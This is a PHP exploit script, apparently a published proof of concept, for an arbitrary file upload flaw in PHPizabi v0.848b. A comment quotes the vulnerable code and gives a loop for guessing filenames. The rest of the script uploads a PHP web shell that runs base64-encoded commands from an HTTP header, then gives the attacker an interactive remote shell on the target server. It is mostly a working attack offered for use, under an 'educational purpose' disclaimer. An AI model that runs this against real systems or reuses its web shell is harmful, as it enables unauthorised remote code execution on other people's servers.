&lt;?php

/*
	---------------------------------------------------------------
	PHPizabi v0.848b C1 HFP1-3 Remote Arbitrary File Upload Exploit
	---------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://www.phpizabi.net/

	This PoC was written for educational purpose. Use it at your own risk.
	Author will be not responsible for any damage.

	[-] vulnerable code in /modules/interact/file.php

	29.		if (isset($_POST[&quot;Submit&quot;])) {
	30.		
	31.			if (is_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;])) {
	32.				$filename = strtolower(rand(1,999).&quot;_&quot;.basename($_FILES[&quot;file&quot;][&quot;name&quot;]));
	33.				move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;system/cache/temp/{$filename}&quot;);
	34.					
	35.				$ext = strtolower(substr(basename($_FILES[&quot;file&quot;][&quot;name&quot;]), strlen(basename($_FILES[&quot;file&quot;][&quot;name&quot;]))-3));
	36.				if (in_array($ext, explode(&quot;,&quot;, $CONF[&quot;ATTACHMENT_ALLOWED_EXTENTIONS&quot;]))) {
	37.					
	38.					//
	39.					//	If the user is online, we will send the page
	40.					//	to the lane system
	41.					//
	42.					if (_fnc(&quot;user&quot;, $_GET[&quot;id&quot;], &quot;last_load&quot;) &gt; date(&quot;U&quot;)-300) {
	43.		
	44.						_fnc(&quot;laneMakeToken&quot;, &quot;file&quot;, $_GET[&quot;id&quot;], array(
	45.							&quot;{user.username}&quot; =&gt; me(&quot;username&quot;),
	46.							&quot;{file}&quot; =&gt; &quot;system/cache/temp/&quot;.$filename,
	47.						));
	48.					}

	PHPizabi is prone to a vulnerability that lets remote attackers to upload and execute arbitrary script code.
	The uploaded file is saved into &quot;/system/cache/temp/&quot; directory and the filename has the form xxx_filename.ext,
	where xxx is a random number between 1 and 999. If directory listing isn&#039;t denied the attacker does not need to
	know the actual filename (this poc works only in this case), otherwise there are various ways to retrieve the
	filename, e.g. with this script:

	$chunk = range(1, 999);
	shuffle($chunk);

	$packet  = &quot;GET {$path}system/cache/temp/%d_filename.ext HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	foreach($chunk as $val)
		if (!preg_match(&quot;/404 Not Found/i&quot;, http_send($host, sprintf($packet, $val)))) break;
*/

error_reporting(0);
set_time_limit(0);
ini_set(&quot;default_socket_timeout&quot;, 5);

function http_send($host, $packet)
{
	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
	  die(&quot;\nsocket_create(): &quot; . socket_strerror($s) . &quot;\n&quot;);

	if (socket_connect($s, $host, 80) == false)
	  die(&quot;\nsocket_connect(): &quot; . socket_strerror(socket_last_error()) . &quot;\n&quot;);

	socket_write($s, $packet, strlen($packet));
	while ($m = socket_read($s, 2048)) $response .= $m;

	socket_close($s);
	return $response;
}

function upload()
{
	global $host, $path;

	$payload  = &quot;--o0oOo0o\r\n&quot;;
	$payload .= &quot;Content-Disposition: form-data; name=\&quot;Submit\&quot;\r\n\r\n\&quot;Send\&quot;\r\n&quot;;
	$payload .= &quot;--o0oOo0o\r\n&quot;;
	$payload .= &quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;poc.php\&quot;\r\n\r\n&quot;;
	$payload .= &quot;&lt;?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))} ?&gt;\r\n&quot;;
	$payload .= &quot;--o0oOo0o--\r\n&quot;;
	
	$packet  = &quot;POST {$path}?L=interact.file&amp;id=0 HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Content-Length: &quot;.strlen($payload).&quot;\r\n&quot;;
	$packet .= &quot;Content-Type: multipart/form-data; boundary=o0oOo0o\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;
	$packet .= $payload;

	http_send($host, $packet);

	$packet  = &quot;GET {$path}system/cache/temp/ HTTP/1.0\r\n&quot;;
	$packet .= &quot;Host: {$host}\r\n&quot;;
	$packet .= &quot;Connection: close\r\n\r\n&quot;;

	if (preg_match(&quot;/[0-9]*_poc.php/&quot;, http_send($host, $packet), $match))
		return $match[0];
	
	die(&quot;\n[-] Directory listing denied\n&quot;);
}

print &quot;\n+-------------------------------------------------------------------------+&quot;;
print &quot;\n| PHPizabi v0.848b C1 HFP1-3 Remote Arbitrary File Upload Exploit by EgiX |&quot;;
print &quot;\n+-------------------------------------------------------------------------+\n&quot;;

if ($argc &lt; 3)
{
	print &quot;\nUsage......: php $argv[0] host path\n&quot;;
	print &quot;\nExample....: php $argv[0] localhost /&quot;;
	print &quot;\nExample....: php $argv[0] localhost /phpizabi/\n\n&quot;;
	die();
}

$host = $argv[1];
$path = $argv[2];

$r_path = upload();

$packet  = &quot;GET {$path}system/cache/temp/{$r_path} HTTP/1.0\r\n&quot;;
$packet .= &quot;Host: {$host}\r\n&quot;;
$packet .= &quot;Cmd: %s\r\n&quot;;
$packet .= &quot;Connection: close\r\n\r\n&quot;;

while(1)
{
	print &quot;\nPHPizabi-shell# &quot;;
	if (($cmd = trim(fgets(STDIN))) == &quot;exit&quot;) break;

	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
	preg_match(&quot;/_code_/&quot;, $response) ? print array_pop(explode(&quot;_code_&quot;, $response)) : die(&quot;\n[-] Exploit failed\n&quot;);
}

?&gt;